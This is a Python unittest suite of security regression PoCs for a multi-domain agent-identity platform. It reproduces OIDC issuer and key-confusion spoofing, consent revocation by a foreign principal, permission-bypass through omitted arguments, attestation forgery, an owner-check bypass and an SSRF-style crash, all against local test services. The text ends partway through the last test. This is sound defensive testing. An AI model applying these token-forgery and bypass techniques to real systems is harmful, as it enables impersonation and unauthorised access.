"""Independent Milestone 10 (Platform v2.1) QA & Adversarial Security Audit Suite.

Read-only verification & deterministic PoC reproduction suite authored by `k8s-qa-reviewer`.
Reproduces all 6 Milestone 10 QA findings (`[CRITICAL-M10-01]`, `[HIGH-M10-01..03]`,
`[MEDIUM-M10-01..02]`) and validates Milestone 10 positive cryptographic, manifest, and
rehearsal hygiene invariants without modifying any production files.
"""

from __future__ import annotations

import inspect
import json
import os
from pathlib import Path
import re
import secrets
import tempfile
import time
from typing import Dict, Tuple
import unittest

import httpx
import yaml

from lineage.common.crypto import jws_sign_compact
from lineage.common.http_utils import ManagedHTTPService
from lineage.common.mtls import WorkloadMTLSBundle, X509FederationTrustStore
from lineage.federation import AutonomousDomainCAService, DomainUserGatewayService
from lineage.identity import TrustBundleResolver
import lineage.k8s.bootstrap_services as bootstrap_services_mod
from lineage.multihost.config_gen import allocate_role_ports, render_role_k8s_manifests
from lineage.oauth_sts import (
    OAuthSTSService,
    OAuthTokenExchangeClient,
    OIDCTokenVerifier,
    generate_keycloak_realm_bundle,
)
from lineage.protocol import (
    CoAuthorizedToken,
    MultiParentToken,
    PermissionLattice,
    create_dpop_proof,
    decode_token,
    mint_root_token,
)
from lineage.registry import AgentCard, AgentDirectoryClient, AgentDirectoryService
from lineage.revocation import RevocationReplicaClient, RevocationService
from lineage.sidecar import LineageSidecar
from lineage.workspace_agents import WorkspaceAssistantPeerApp, WorkspaceVaultMCPApp

REPO_ROOT = Path(__file__).resolve().parents[2]
M10_REHEARSAL_DIR = (
    REPO_ROOT / "lineage" / "k8s" / "runs" / "20261125-m10-expanded-scenarios-rehearsal"
)


class _MemSAVerifier:
    """In-memory K8s SA token verifier for deterministic CA tests."""

    def __init__(self, sa_map: Dict[str, Tuple[str, str]]) -> None:
        self._map = dict(sa_map)

    def verify_sa_jwt(self, raw_jwt: str, now: float | None = None) -> Tuple[str, str, float]:
        if raw_jwt not in self._map:
            raise ValueError("unauthorized_sa")
        ns, sa = self._map[raw_jwt]
        return ns, sa, (now or time.time()) + 600.0


class Milestone10QAReviewSuite(unittest.TestCase):
    """Independent QA & adversarial PoC suite for Milestone 10 (Platform v2.1)."""

    def test_01_poc_critical_m10_01_cross_domain_oidc_idp_trust_and_key_confusion(self) -> None:
        """PoC [CRITICAL-M10-01]: Foreign STS (`org-alpha.io`) spoofs `@org-beta.io` principals on `beta-ca` & `beta-user-gateway`."""
        # 1. Inspect `bootstrap_services.py` source: non-alpha `domain-ca` & `user-gateway` inject `org-alpha.io` OIDC!
        bs_src = inspect.getsource(bootstrap_services_mod.main)
        self.assertIn(
            '[trust_domain, "org-alpha.io"]',
            bs_src,
            "Expected reproduction of cross-domain org-alpha.io OIDC trust in domain-ca",
        )
        self.assertIn(
            '[trust_domain_gw, "org-alpha.io"]',
            bs_src,
            "Expected reproduction of cross-domain org-alpha.io OIDC trust in user-gateway",
        )

        # 2. Spin up TWO distinct organization STSes (`alpha-sts` for `org-alpha.io`, `beta-sts` for `org-beta.io`)
        bundle_a = generate_keycloak_realm_bundle()
        bundle_b = generate_keycloak_realm_bundle()
        sts_alpha = OAuthSTSService(
            trust_domain="org-alpha.io",
            realm="lct",
            user_passwords=bundle_a.user_passwords,
            client_secrets=bundle_a.client_secrets,
            host="127.0.0.1",
            port=0,
        )
        sts_beta = OAuthSTSService(
            trust_domain="org-beta.io",
            realm="lct",
            user_passwords=bundle_b.user_passwords,
            client_secrets=bundle_b.client_secrets,
            host="127.0.0.1",
            port=0,
        )
        u_alpha = sts_alpha.start()
        u_beta = sts_beta.start()
        try:
            # Mirror `bootstrap_services.py` wiring on `beta-ca` / `beta-user-gateway`
            beta_verifier = OIDCTokenVerifier(
                jwks_urls=[
                    f"{u_beta}/realms/lct/protocol/openid-connect/certs",
                    f"{u_alpha}/realms/lct/protocol/openid-connect/certs",
                ],
                allowed_issuers=[
                    f"{u_beta}/realms/lct",
                    f"{u_alpha}/realms/lct",
                ],
                default_user_domain="org-beta.io",
            )
            cli_a = OAuthTokenExchangeClient(realm="lct", client_secrets=bundle_a.client_secrets)

            # Flaw A: `alpha-sts` (`org-alpha.io`!) mints a token for `bob` (`lct_sub="user:bob@org-beta.io"`),
            # and `beta_verifier` (`org-beta.io`) accepts foreign `alpha-sts` as authoritative for `@org-beta.io`!
            alpha_bob_tok = cli_a.login_user_password(
                u_alpha, "bob", bundle_a.user_passwords["bob"], "lct-gateway"
            )["access_token"]
            ver_bob = beta_verifier.verify_jwt(alpha_bob_tok)
            self.assertEqual(ver_bob.canonical_lct_sub, "user:bob@org-beta.io")

            # Flaw B: Standard OIDC token from `alpha-sts` (`org-alpha.io`) without custom `lct_sub`
            # escalates from `org-alpha.io` into `"user:operator@org-beta.io"` via `default_user_domain="org-beta.io"`!
            alpha_op_jwt, _ = sts_alpha._mint_jwt(
                issuer=f"{u_alpha}/realms/lct",
                sub="operator-uuid-1",
                preferred_username="operator",
                aud="lct-gateway",
                azp="lct-gateway",
                scope="openid profile email",
                lct_sub=None,
            )
            ver_op = beta_verifier.verify_jwt(alpha_op_jwt)
            self.assertEqual(
                ver_op.canonical_lct_sub,
                "user:operator@org-beta.io",
                "Expected PoC reproduction: unqualified alpha-sts 'operator' escalated to @org-beta.io",
            )

            # Flaw C: Flat `_keys_by_kid` key confusion — `alpha-sts`'s RS256 key signs a JWT spoofing
            # `iss = f"{u_beta}/realms/lct"` (`beta-sts`), and `OIDCTokenVerifier` accepts it!
            spoofed_beta_iss_jwt, _ = sts_alpha._mint_jwt(
                issuer=f"{u_beta}/realms/lct",
                sub="spoofed-bob",
                preferred_username="bob",
                aud="lct-gateway",
                azp="lct-gateway",
                scope="openid",
                lct_sub="user:bob@org-beta.io",
            )
            ver_spoof = beta_verifier.verify_jwt(spoofed_beta_iss_jwt)
            self.assertEqual(ver_spoof.issuer, f"{u_beta}/realms/lct")
            self.assertEqual(ver_spoof.canonical_lct_sub, "user:bob@org-beta.io")
        finally:
            sts_alpha.stop()
            sts_beta.stop()

    def test_02_poc_high_m10_01_unisolated_consent_wallet_and_foreign_revoke_own_consent(self) -> None:
        """PoC [HIGH-M10-01]: Unisolated `_consent_wallet` cross-principal overwrite & unauthenticated foreign `revoke_own_consent`."""
        bundle = generate_keycloak_realm_bundle()
        sts = OAuthSTSService(
            trust_domain="org-beta.io",
            realm="lct",
            user_passwords=bundle.user_passwords,
            client_secrets=bundle.client_secrets,
            host="127.0.0.1",
            port=0,
        )
        sts_u = sts.start()
        resolver = TrustBundleResolver()
        oidc_b = OIDCTokenVerifier(
            jwks_urls=[f"{sts_u}/realms/lct/protocol/openid-connect/certs"],
            expected_issuer=f"{sts_u}/realms/lct",
            default_user_domain="org-beta.io",
        )
        ca_a = AutonomousDomainCAService("org-alpha.io", "lineage-alpha", host="127.0.0.1", port=0)
        ca_b = AutonomousDomainCAService(
            "org-beta.io",
            "lineage-beta",
            oidc_verifier=oidc_b,
            consent_issuer_policy="assistant-bob=user:bob@org-beta.io:commit_joint_change,service_diag_read",
            host="127.0.0.1",
            port=0,
        )
        ca_p = AutonomousDomainCAService("org-payment.io", "lineage-pay", host="127.0.0.1", port=0)
        sa_map = {"sa-bob": ("lineage-beta", "assistant-bob"), "sa-alice": ("lineage-alpha", "assistant-alice")}
        for c in (ca_a, ca_b, ca_p):
            c.k8s_verifier = _MemSAVerifier(sa_map)  # type: ignore[assignment]
            resolver.register_domain_ca(c.ca)
        ca_a.start()
        ca_b.start()
        ca_p.start()

        rev_b = RevocationService(ca_b.ca.issue_workload("/ns/sys/sa/revocation"), resolver, host="127.0.0.1", port=0)
        rev_b_u = rev_b.start()
        rep_b = RevocationReplicaClient(rev_b_u, resolver)
        dir_svc = AgentDirectoryService(resolver, host="127.0.0.1", port=0, registry_mode="centralized")
        dir_u = dir_svc.start()
        dir_cli = AgentDirectoryClient(dir_u, resolver)

        tf_bob = tempfile.NamedTemporaryFile("w", delete=False)
        tf_bob.write("sa-bob")
        tf_bob.close()

        started = [sts, ca_a, ca_b, ca_p, rev_b, dir_svc]
        try:
            alice_id = ca_a.ca.issue_workload("/ns/lineage-alpha/sa/assistant-alice")
            bob_id = ca_b.ca.issue_workload("/ns/lineage-beta/sa/assistant-bob")
            gw_a = ca_a.ca.issue_workload("/ns/lineage-alpha/sa/e2e-user-gateway")
            gw_p = ca_p.ca.issue_workload("/ns/lineage-pay/sa/pay-caller")

            lsec_a, lsec_b = secrets.token_urlsafe(18), secrets.token_urlsafe(18)
            sc_a = LineageSidecar(
                identity=alice_id,
                trust_resolver=resolver,
                app_upstream_url="http://127.0.0.1:1",
                loopback_secret=lsec_a,
                revocation_replica=rep_b,
                directory_client=dir_cli,
                inbound_host="127.0.0.1",
                inbound_port=0,
                outbound_port=0,
                local_ca_url=ca_a.base_url,
            )
            in_a, out_a = sc_a.start()
            app_a = WorkspaceAssistantPeerApp("alice", "user:alice@org-alpha.io", out_a, lsec_a, port=0)
            sc_a.app_upstream_url = app_a.start().rstrip("/")

            sc_b = LineageSidecar(
                identity=bob_id,
                trust_resolver=resolver,
                app_upstream_url="http://127.0.0.1:1",
                loopback_secret=lsec_b,
                revocation_replica=rep_b,
                directory_client=dir_cli,
                inbound_host="127.0.0.1",
                inbound_port=0,
                outbound_port=0,
                resource_owner_sub="user:bob@org-beta.io",
                owner_protected_tools=["service_diag_read"],
                allowed_co_auth_tools=["service_diag_read", "commit_joint_change"],
                local_ca_url=ca_b.base_url,
                sa_token_path=tf_bob.name,
            )
            in_b, out_b = sc_b.start()
            app_b = WorkspaceAssistantPeerApp("bob", "user:bob@org-beta.io", out_b, lsec_b, port=0)
            sc_b.app_upstream_url = app_b.start().rstrip("/")
            started.extend([sc_a, app_a, sc_b, app_b])

            for wid, ep, sk in (
                (alice_id, in_a, ["workspace.orchestrate"]),
                (bob_id, in_b, ["workspace.tech_review", "workspace.bob_private"]),
            ):
                card = AgentCard.sign_and_create(wid, wid.spiffe_id, endpoint=ep, return_endpoint=ep, skills=sk)
                dir_cli.register(card)

            ocli = OAuthTokenExchangeClient(realm="lct", client_secrets=bundle.client_secrets)
            bob_oidc = ocli.login_user_password(sts_u, "bob", bundle.user_passwords["bob"], "lct-gateway")["access_token"]

            tid = "poc-m10-wallet"
            tok_alice = mint_root_token(
                ca_a.ca,
                tid,
                "user:alice@org-alpha.io",
                gw_a.jkt,
                alice_id.spiffe_id,
                alice_id.jkt,
                PermissionLattice.create(tools=["service_diag_read", "commit_joint_change"], max_calls=8),
            ).encode_compact()
            url_a = f"{in_a.rstrip('/')}/a2a/task"
            r_mint = httpx.post(
                url_a,
                json={
                    "op": "request_peer_co_auth_and_read",
                    "target_tool": "commit_joint_change",
                    "consent_tools": ["commit_joint_change"],
                    "owner_oidc_token": bob_oidc,
                    "cache_consent_key": "shared-k",
                    "mint_consent_only": True,
                },
                headers={"Authorization": f"DPoP {tok_alice}", "DPoP": create_dpop_proof(gw_a, "POST", url_a, tok_alice)},
            )
            self.assertEqual(r_mint.status_code, 200, r_mint.text)
            bob_consent_pfx = r_mint.json()["consent_lineage_path"]

            # Part A: `_consent_wallet` stores raw string key `"shared-k"` with ZERO `(sub, task_id)` scoping!
            self.assertIn("shared-k", app_a._consent_wallet)

            # Part B: Foreign principal `user:carol@org-payment.io` (`gw_p`) calls `revoke_own_consent` on `Assistant-B`
            # WITHOUT being `user:bob@org-beta.io` and WITHOUT Bob's OIDC token -> succeeds `200` and revokes Bob's consent!
            tok_foreign_carol = mint_root_token(
                ca_p.ca,
                "foreign-carol-ctl",
                "user:carol@org-payment.io",
                gw_p.jkt,
                bob_id.spiffe_id,
                bob_id.jkt,
                PermissionLattice.create(tools=["commit_joint_change"], max_calls=2),
            ).encode_compact()
            url_b = f"{in_b.rstrip('/')}/a2a/task"
            r_foreign_rev = httpx.post(
                url_b,
                json={"op": "revoke_own_consent", "target_task_id": tid, "prefix": bob_consent_pfx},
                headers={
                    "Authorization": f"DPoP {tok_foreign_carol}",
                    "DPoP": create_dpop_proof(gw_p, "POST", url_b, tok_foreign_carol),
                },
            )
            self.assertEqual(
                r_foreign_rev.status_code,
                200,
                "Expected PoC reproduction: foreign principal carol revoked Bob's consent via revoke_own_consent",
            )
            rep_b.sync_now()
            self.assertIsNotNone(rep_b.trie.check_chain(bob_consent_pfx, [], trust_domain="org-beta.io"))
        finally:
            os.unlink(tf_bob.name)
            for s in reversed(started):
                try:
                    s.stop()
                except Exception:
                    pass

    def test_03_poc_high_m10_02_omitted_argument_bypass_of_lattice_bounds_and_whitelists(self) -> None:
        """PoC [HIGH-M10-02]: Omitting constrained keys bypasses `PermissionLattice.check_invocation` & triggers Vault defaults."""
        strict_lat = PermissionLattice.create(
            tools=["reserve_cloud_budget", "commit_negotiated_contract"],
            max_amount=10.0,
            numeric_bounds={"unit_price_usd": 50.0, "max_penalty_pct": 2.0},
            allowed_targets=["compliance-ledger"],
            param_whitelist={
                "project_code": ["PRJ-RESTRICTED"],
                "contract_id": ["NDA-RESTRICTED"],
                "warranty_tier": ["36M"],
            },
            max_calls=5,
        )

        # Omitting `amount`, `project_code`, and `target` passes `check_invocation`!
        ok_spend, _ = strict_lat.check_invocation("tools/call", "reserve_cloud_budget", arguments={})
        self.assertTrue(ok_spend, "Expected PoC reproduction: omitted amount/project_code/target bypassed lattice")

        # Omitting `unit_price_usd`, `max_penalty_pct`, `contract_id`, `warranty_tier` passes `check_invocation`!
        ok_nda, _ = strict_lat.check_invocation("tools/call", "commit_negotiated_contract", arguments={})
        self.assertTrue(ok_nda, "Expected PoC reproduction: omitted numeric_bounds/param_whitelist bypassed lattice")

        # End-to-end against real `LineageSidecar` + `WorkspaceVaultMCPApp`
        ca = AutonomousDomainCAService("org-alpha.io", "lineage-alpha", host="127.0.0.1", port=0)
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca.ca)
        gw = ca.ca.issue_workload("/ns/lineage-alpha/sa/e2e-user-gateway")
        vault_id = ca.ca.issue_workload("/ns/lineage-alpha/sa/assistant-vault")
        lsec = secrets.token_urlsafe(18)
        sc = LineageSidecar(
            identity=vault_id,
            trust_resolver=resolver,
            app_upstream_url="http://127.0.0.1:1",
            loopback_secret=lsec,
            is_tool_server=True,
            inbound_host="127.0.0.1",
            inbound_port=0,
            outbound_port=0,
        )
        in_u, out_u = sc.start()
        vault_app = WorkspaceVaultMCPApp(loopback_secret=lsec, outbound_proxy_url=out_u, port=0)
        sc.app_upstream_url = vault_app.start().rstrip("/")
        try:
            tok = mint_root_token(
                ca.ca,
                "poc-omit",
                "user:alice@org-alpha.io",
                gw.jkt,
                vault_id.spiffe_id,
                vault_id.jkt,
                strict_lat,
            ).encode_compact()
            mcp_u = f"{in_u.rstrip('/')}/mcp"
            r = httpx.post(
                mcp_u,
                json={"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "reserve_cloud_budget", "arguments": {}}},
                headers={"Authorization": f"DPoP {tok}", "DPoP": create_dpop_proof(gw, "POST", mcp_u, tok)},
            )
            self.assertEqual(r.status_code, 200)
            data = r.json()["result"]["data"]
            self.assertEqual(data["charged_usd"], 250.0)
            self.assertEqual(data["project_code"], "PRJ-ATLAS")
            self.assertEqual(data["target"], "cloud-infra-escrow")
        finally:
            vault_app.stop()
            sc.stop()

    def test_04_poc_high_m10_03_suffix_only_compliance_attestation_forgery(self) -> None:
        """PoC [HIGH-M10-03]: Cross-domain `/sa/assistant-dave` SVID forges compliance attestation via suffix-only check."""
        ca_alpha = AutonomousDomainCAService("org-alpha.io", "lineage-alpha", host="127.0.0.1", port=0)
        ca_pay = AutonomousDomainCAService("org-payment.io", "lineage-pay", host="127.0.0.1", port=0)
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca_alpha.ca)
        resolver.register_domain_ca(ca_pay.ca)

        # Rogue workload in `org-alpha.io` (NOT `org-beta.io`!) with suffix `/sa/assistant-dave`
        rogue_dave = ca_alpha.ca.issue_workload("/ns/lineage-alpha/sa/assistant-dave")
        vault_id = ca_pay.ca.issue_workload("/ns/lineage-pay/sa/assistant-vault")
        lsec = secrets.token_urlsafe(18)
        sc = LineageSidecar(
            identity=vault_id,
            trust_resolver=resolver,
            app_upstream_url="http://127.0.0.1:1",
            loopback_secret=lsec,
            inbound_host="127.0.0.1",
            inbound_port=0,
            outbound_port=0,
        )
        _, out_u = sc.start()
        try:
            now_ts = time.time()
            forged_cross_domain_att = jws_sign_compact(
                {
                    "jti": "att-cross-domain-1",
                    "issuer_spiffe_id": rogue_dave.spiffe_id,
                    "issuer_jwk": rogue_dave.public_jwk(),
                    "issuer_svid": rogue_dave.workload_svid,
                    "task_id": "t-sod-poc",
                    "release_id": "REL-2026-884",
                    "artifact_sha256": "sha256:rogue",
                    "scan_passed": True,
                    "iat": now_ts,
                    "exp": now_ts + 300.0,
                },
                rogue_dave.keypair,
                typ="lct-compliance-attestation+jwt",
            )
            r_ver = httpx.post(
                f"{out_u.rstrip('/')}/v1/proxy/call",
                json={
                    "action": "verify_compliance_attestation",
                    "attestation_jws": forged_cross_domain_att,
                    "expected_task_id": "t-sod-poc",
                    "expected_release_id": "REL-2026-884",
                },
                headers={"X-LCT-Loopback-Auth": lsec},
            )
            self.assertEqual(
                r_ver.status_code,
                200,
                "Expected PoC reproduction: cross-domain spiffe://org-alpha.io/.../sa/assistant-dave accepted as scanner",
            )
            self.assertTrue(r_ver.json()["valid"])
        finally:
            sc.stop()

    def test_05_poc_medium_m10_01_oauth_dual_mode_a2a_jsonrpc_private_tool_bypass(self) -> None:
        """PoC [MEDIUM-M10-01]: Foreign OAuth Bearer `POST /a2a` with JSON-RPC `parts[].data.private_tool` bypasses Sidecar."""
        bundle = generate_keycloak_realm_bundle()
        sts = OAuthSTSService(
            trust_domain="org-alpha.io",
            realm="lct",
            user_passwords=bundle.user_passwords,
            client_secrets=bundle.client_secrets,
            host="127.0.0.1",
            port=0,
        )
        sts_u = sts.start()
        ca_b = AutonomousDomainCAService("org-beta.io", "lineage-beta", host="127.0.0.1", port=0)
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca_b.ca)
        bob_id = ca_b.ca.issue_workload("/ns/lineage-beta/sa/assistant-bob")
        oidc_v = OIDCTokenVerifier(
            jwks_urls=[f"{sts_u}/realms/lct/protocol/openid-connect/certs"],
            expected_issuer=f"{sts_u}/realms/lct",
            default_user_domain="org-alpha.io",
        )
        ocli = OAuthTokenExchangeClient(realm="lct", client_secrets=bundle.client_secrets)
        lsec = secrets.token_urlsafe(18)

        reached_upstream = {"count": 0}
        up_srv = ManagedHTTPService(
            "probe-app",
            dispatcher=lambda _req: (
                reached_upstream.__setitem__("count", reached_upstream["count"] + 1)
                or (200, {"reached_app": True}, {})
            ),
            host="127.0.0.1",
            port=0,
        )
        up_u = up_srv.start()
        sc = LineageSidecar(
            identity=bob_id,
            trust_resolver=resolver,
            app_upstream_url=up_u,
            loopback_secret=lsec,
            inbound_host="127.0.0.1",
            inbound_port=0,
            outbound_port=0,
            delegation_mode="dual",
            oauth_central_verifier=oidc_v,
            oauth_local_verifier=oidc_v,
            oauth_exchange_client=ocli,
            oauth_central_sts_origins_provider=lambda: [sts_u],
            oauth_domain_sts_origins_provider=lambda _td: [sts_u],
            resource_owner_sub="user:bob@org-beta.io",
            owner_protected_tools=["hr_salary_read"],
        )
        in_u, _ = sc.start()
        try:
            alice_tok = ocli.login_user_password(sts_u, "alice", bundle.user_passwords["alice"], "lct-gateway")["access_token"]
            ex_alice = ocli.exchange_token(
                sts_origins=sts_u,
                subject_token=alice_tok,
                target_audience=bob_id.spiffe_id,
                client_id="lct-gateway",
            ).access_token
            hdrs = {"Authorization": f"Bearer {ex_alice}", "X-LCT-Delegation-Mode": "oauth_centralized"}

            # Top-level `private_tool` on `/a2a/task` is blocked (`403`)
            r_top = httpx.post(f"{in_u}/a2a/task", json={"private_tool": "hr_salary_read"}, headers=hdrs)
            self.assertEqual(r_top.status_code, 403)
            self.assertEqual(reached_upstream["count"], 0)

            # A2A v1.0 JSON-RPC `parts[].data.private_tool` on `/a2a` bypasses Sidecar and reaches `app` (`200`)!
            r_a2a = httpx.post(
                f"{in_u}/a2a",
                json={
                    "jsonrpc": "2.0",
                    "id": "1",
                    "method": "message/send",
                    "params": {
                        "message": {
                            "role": "ROLE_USER",
                            "parts": [{"data": {"private_tool": "hr_salary_read"}}],
                        }
                    },
                },
                headers=hdrs,
            )
            self.assertEqual(
                r_a2a.status_code,
                200,
                "Expected PoC reproduction: OAuth A2A JSON-RPC parts[].data.private_tool bypassed Sidecar owner check",
            )
            self.assertEqual(reached_upstream["count"], 1)
        finally:
            sc.stop()
            up_srv.stop()
            sts.stop()

    def test_06_poc_medium_m10_02_user_gateway_500_ssrf_and_foreign_sender_jkt(self) -> None:
        """PoC [MEDIUM-M10-02]: `DomainUserGatewayService` `500` on SSRF/malformed token & cross-domain `sender_jkt` acceptance."""
        ca_a = AutonomousDomainCAService("org-alpha.io", "lineage-alpha", host="127.0.0.1", port=0)
        ca_b = AutonomousDomainCAService(
            "org-beta.io",
            "lineage-beta",
            authorized_gateway_sa="beta-user-gateway",
            host="127.0.0.1",
            port=0,
        )
        bundle = generate_keycloak_realm_bundle()
        sts = OAuthSTSService(
            trust_domain="org-beta.io",
            realm="lct",
            user_passwords=bundle.user_passwords,
            client_secrets=bundle.client_secrets,
            host="127.0.0.1",
            port=0,
        )
        sts_u = sts.start()
        oidc_b = OIDCTokenVerifier(
            jwks_urls=[f"{sts_u}/realms/lct/protocol/openid-connect/certs"],
            expected_issuer=f"{sts_u}/realms/lct",
            default_user_domain="org-beta.io",
        )
        ca_b.oidc_verifier = oidc_b
        ca_b.k8s_verifier = _MemSAVerifier({"sa-bgw": ("lineage-beta", "beta-user-gateway")})  # type: ignore[assignment]
        ca_b_u = ca_b.start()

        x509_store = X509FederationTrustStore()
        x509_store.register_domain_root_pem("org-alpha.io", ca_a.x509_ca.export_root_pem())
        x509_store.register_domain_root_pem("org-beta.io", ca_b.x509_ca.export_root_pem())

        bgw_id = ca_b.ca.issue_workload("/ns/lineage-beta/sa/beta-user-gateway")
        bgw_mtls = WorkloadMTLSBundle(
            bgw_id.spiffe_id,
            bgw_id.keypair,
            ca_b.x509_ca.issue_x509_svid(bgw_id.spiffe_id, bgw_id.keypair.public_jwk(), ip_addresses=("127.0.0.1",)),
            x509_store,
        )
        agw_id = ca_a.ca.issue_workload("/ns/lineage-alpha/sa/e2e-user-gateway")
        agw_mtls = WorkloadMTLSBundle(
            agw_id.spiffe_id,
            agw_id.keypair,
            ca_a.x509_ca.issue_x509_svid(agw_id.spiffe_id, agw_id.keypair.public_jwk(), ip_addresses=("127.0.0.1",)),
            x509_store,
        )
        bob_id = ca_b.ca.issue_workload("/ns/lineage-beta/sa/assistant-bob")
        ugw = DomainUserGatewayService(
            identity=bgw_id,
            local_ca_url=ca_b_u,
            sa_jwt_provider=lambda: "sa-bgw",
            oidc_verifier=oidc_b,
            mtls_bundle=bgw_mtls,
            inbound_host="127.0.0.1",
            inbound_port=0,
            health_port=-1,
        )
        ugw_u = ugw.start()
        try:
            ocli = OAuthTokenExchangeClient(realm="lct", client_secrets=bundle.client_secrets)
            bob_tok = ocli.login_user_password(sts_u, "bob", bundle.user_passwords["bob"], "lct-gateway")["access_token"]

            with httpx.Client(verify=agw_mtls.verify_for_target(ugw_u, expected_spiffe_id=bgw_id.spiffe_id)) as cli:
                # Part A: Forbidden public IP target `https://8.8.8.8:8443` triggers unhandled `LocatorError` -> HTTP 500!
                r_ssrf = cli.post(
                    f"{ugw_u}/v1/gateway/dispatch",
                    json={
                        "task_id": "t-ssrf",
                        "sub": "user:bob@org-beta.io",
                        "user_oidc_token": bob_tok,
                        "first_hop_spiffe_id": bob_id.spiffe_id,
                        "first_hop_jkt": bob_id.jkt,
                        "permissions": PermissionLattice.create(tools=["service_diag_read"], max_calls=2).to_dict(),
                        "target_endpoint": "https://8.8.8.8:8443",
                        "payload": {},
                    },
                )
                self.assertEqual(
                    r_ssrf.status_code,
                    500,
                    "Expected PoC reproduction: unhandled LocatorError returned 500 instead of 403",
                )

                # Part B: Malformed `compact_token` in `/v1/gateway/dispatch` triggers unhandled `TokenError` -> HTTP 500!
                r_bad_tok = cli.post(
                    f"{ugw_u}/v1/gateway/dispatch",
                    json={
                        "sub": "user:bob@org-beta.io",
                        "user_oidc_token": bob_tok,
                        "compact_token": "malformed-not-lct",
                        "target_endpoint": "https://10.29.101.203:31103",
                        "payload": {},
                    },
                )
                self.assertEqual(r_bad_tok.status_code, 500)

                # Part C: `/v1/gateway/mint-root` accepts `"sender_jkt": agw_id.jkt` from foreign `org-alpha.io` caller!
                r_mint = cli.post(
                    f"{ugw_u}/v1/gateway/mint-root",
                    json={
                        "task_id": "t-foreign-sender",
                        "sub": "user:bob@org-beta.io",
                        "user_oidc_token": bob_tok,
                        "sender_jkt": agw_id.jkt,
                        "first_hop_spiffe_id": bob_id.spiffe_id,
                        "first_hop_jkt": bob_id.jkt,
                        "permissions": PermissionLattice.create(tools=["service_diag_read"], max_calls=2).to_dict(),
                    },
                )
                self.assertEqual(r_mint.status_code, 200)
                parsed_root = decode_token(r_mint.json()["compact_token"])
                self.assertEqual(
                    parsed_root.root.sender_jkt,
                    agw_id.jkt,
                    "Expected PoC reproduction: org-beta.io RootBlock sender_jkt bound to foreign org-alpha.io caller",
                )
        finally:
            ugw.stop()
            ca_b.stop()
            sts.stop()
            bgw_mtls.cleanup()
            agw_mtls.cleanup()

    def test_07_positive_mtls_channel_binding_coauth_and_fault_gating(self) -> None:
        """Verify positive M10 invariants: mTLS channel binding (`lct1.`, `lctmp1.`, `lctco1.`), fault gate, & manifests."""
        for role in ("alpha", "beta", "pay"):
            ports = allocate_role_ports(role, topology="workspace")
            man = render_role_k8s_manifests(role=role, role_ports=ports, topology="workspace", registry_mode="centralized")
            self.assertNotIn("AUTHORIZED_GATEWAY_SAS", man)
            docs = [d for d in yaml.safe_load_all(man) if d and d.get("kind") == "Deployment"]
            ca_dep = next(d for d in docs if d["metadata"]["name"].endswith("-ca"))
            ca_env = {e["name"]: e["value"] for e in ca_dep["spec"]["template"]["spec"]["containers"][0]["env"]}
            gw_sa = ca_env.get("AUTHORIZED_GATEWAY_SA", "")
            self.assertFalse(gw_sa.startswith("assistant-"), f"Assistant SA must never be gateway SA: {gw_sa}")
            for forbidden_tool in (
                "hr_salary_read",
                "calendar_write",
                "alice_private_roadmap",
                "pricing_floor_read",
                "export_raw_patient_records",
            ):
                self.assertNotIn(forbidden_tool, ca_env["CONSENT_ISSUER_POLICY"])

        ca_a = AutonomousDomainCAService("org-alpha.io", "lineage-alpha", host="127.0.0.1", port=0)
        ca_b = AutonomousDomainCAService("org-beta.io", "lineage-beta", host="127.0.0.1", port=0)
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca_a.ca)
        resolver.register_domain_ca(ca_b.ca)
        x509_store = X509FederationTrustStore()
        x509_store.register_domain_root_pem("org-alpha.io", ca_a.x509_ca.export_root_pem())
        x509_store.register_domain_root_pem("org-beta.io", ca_b.x509_ca.export_root_pem())

        alice_id = ca_a.ca.issue_workload("/ns/lineage-alpha/sa/assistant-alice")
        impostor_id = ca_a.ca.issue_workload("/ns/lineage-alpha/sa/impostor")
        bob_id = ca_b.ca.issue_workload("/ns/lineage-beta/sa/assistant-bob")

        impostor_mtls = WorkloadMTLSBundle(
            impostor_id.spiffe_id,
            impostor_id.keypair,
            ca_a.x509_ca.issue_x509_svid(impostor_id.spiffe_id, impostor_id.keypair.public_jwk(), ip_addresses=("127.0.0.1",)),
            x509_store,
        )
        bob_mtls = WorkloadMTLSBundle(
            bob_id.spiffe_id,
            bob_id.keypair,
            ca_b.x509_ca.issue_x509_svid(bob_id.spiffe_id, bob_id.keypair.public_jwk(), ip_addresses=("127.0.0.1",)),
            x509_store,
        )
        lsec = secrets.token_urlsafe(18)
        prev_fault = os.environ.pop("LCT_ENABLE_FAULT_INJECTION", None)
        sc_bob = LineageSidecar(
            identity=bob_id,
            trust_resolver=resolver,
            app_upstream_url="http://127.0.0.1:1",
            loopback_secret=lsec,
            mtls_bundle=bob_mtls,
            is_tool_server=True,
            inbound_host="127.0.0.1",
            inbound_port=0,
            outbound_port=0,
        )
        in_b, out_b = sc_bob.start()
        try:
            # 2a. `replay_cached_hop_tool` returns 403 when `LCT_ENABLE_FAULT_INJECTION` is unset
            r_fault = httpx.post(
                f"{out_b.rstrip('/')}/v1/proxy/call",
                json={"action": "replay_cached_hop_tool", "cache_key": "k", "target_url": in_b, "tool_name": "x"},
                headers={"X-LCT-Loopback-Auth": lsec},
            )
            self.assertEqual(r_fault.status_code, 403)
            self.assertEqual(r_fault.json()["error"], "fault_injection_disabled")

            # 2b. `impostor_mtls` presenting `alice_id`'s `lct1.`, `lctmp1.`, and `lctco1.` tokens -> 403 MTLS_CHANNEL_BINDING_MISMATCH!
            perms = PermissionLattice.create(tools=["calendar_free_busy"], max_calls=4)
            t1 = mint_root_token(
                ca_a.ca, "t-cb", "user:alice@org-alpha.io", alice_id.jkt,
                alice_id.spiffe_id, alice_id.jkt, perms, hop_segment="B1",
            )
            t2 = mint_root_token(
                ca_a.ca, "t-cb", "user:alice@org-alpha.io", alice_id.jkt,
                alice_id.spiffe_id, alice_id.jkt, perms, hop_segment="B2",
            )
            t_owner = mint_root_token(
                ca_b.ca, "t-cb", "user:bob@org-beta.io", bob_id.jkt,
                alice_id.spiffe_id, alice_id.jkt, PermissionLattice.create(tools=["calendar_free_busy"], max_amount=0.0, max_calls=4),
                hop_segment="Consent",
            )
            mp_tok = MultiParentToken.assemble_and_sign(alice_id, [t1]).encode_compact()
